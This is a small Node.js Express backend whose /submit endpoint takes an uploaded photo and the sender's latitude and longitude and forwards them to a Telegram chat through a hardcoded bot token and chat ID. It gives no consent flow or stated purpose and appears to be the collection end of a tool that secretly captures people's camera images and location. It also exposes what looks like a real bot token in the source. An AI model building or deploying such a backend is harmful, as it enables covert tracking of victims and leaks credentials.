const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { FormData } = require("undici");

const app = express();
app.use(cors());

const upload = multer();

// 🔴 PUT REAL VALUES LATER
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "8522367236";

app.get("/", (req, res) => {
  res.send("Backend is alive");
});

app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { latitude, longitude } = req.body;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", new Blob([req.file.buffer]), "photo.jpg");
    form.append(
      "caption",
      `📍 Location\nLat: ${latitude}\nLong: ${longitude}`
    );

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });

    res.json({ success: true });
  } catch (err) {
    console.error("ERROR:", err);
    res.status(500).json({ error: "Failed" });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Backend running on port " + PORT);
});

